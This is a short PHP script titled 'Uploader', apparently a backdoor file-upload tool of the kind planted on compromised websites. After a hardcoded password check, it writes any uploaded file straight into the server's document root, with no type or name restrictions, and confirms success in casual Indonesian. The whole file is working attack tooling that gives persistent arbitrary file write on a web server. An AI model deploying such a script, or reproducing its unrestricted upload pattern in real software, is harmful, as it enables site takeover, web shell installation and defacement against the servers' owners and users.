<?php
$pass = "dkt1941";
session_start();
?>

<style>
#footer{background:#f0f0f0;position:absolute;bottom:0;width:100%;
   text-align:center;color:#808080;} 
</style>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html><head>
<meta charset="utf-8">
<link rel="shortcut icon" href="http://arjunowidya.best/images/icon.png"/>
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
	<title>Uploader</title>
	<link rel="shortcut icon" href="http://arjunowidya.xyz/images/icon.png"/>


<meta http-equiv="Content-Type" content="text/html; charset=windows-1256" />
</head><body>

 <div id="footer"><p>Copyright &copy; Arjuno Widya Pratama. &copy;2020.</p></div>
</div>




<?php
if (!empty($_GET['action']) &&  $_GET['action'] == "logout") {session_destroy();unset ($_SESSION['pass']);}

$path_name = pathinfo($_SERVER['PHP_SELF']);
$this_script = $path_name['basename'];
if (empty($_SESSION['pass'])) {$_SESSION['pass']='';}
if (empty($_POST['pass'])) {$_POST['pass']='';}
if ( $_SESSION['pass']!== $pass) 
{
    if ($_POST['pass'] == $pass) {$_SESSION['pass'] = $pass; }
    else 
    {
        echo '<form action="'.$_SERVER['PHP_SELF'].'" method="post"><input name="pass" type="password"><input type="submit"></form>';
        exit;
    }
}
?>



<?php echo "<form method='post' enctype='multipart/form-data'> <input type='file' name='file'> <input type='submit' name='upload' value='upload'> </form>"; $root = $_SERVER['DOCUMENT_ROOT']; $files = $_FILES['file']['name']; $dest = $root.'/'.$files; if(isset($_POST['upload'])) { if(is_writable($root)) { if(@copy($_FILES['file']['tmp_name'], $dest)) { $web = "http://".$_SERVER['HTTP_HOST']."/"; echo "uploadnya sukses beb :* -> <a href='$web$files' target='_blank'><b><u>$web$files</u></b></a>"; } else { echo "gagal upload root >:("; } } else { if(@copy($_FILES['file']['tmp_name'], $files)) { echo "uploadnya sukses beb :* <b>$files</b> di folder ini"; } else { echo "gagal upload >:("; } } } ?>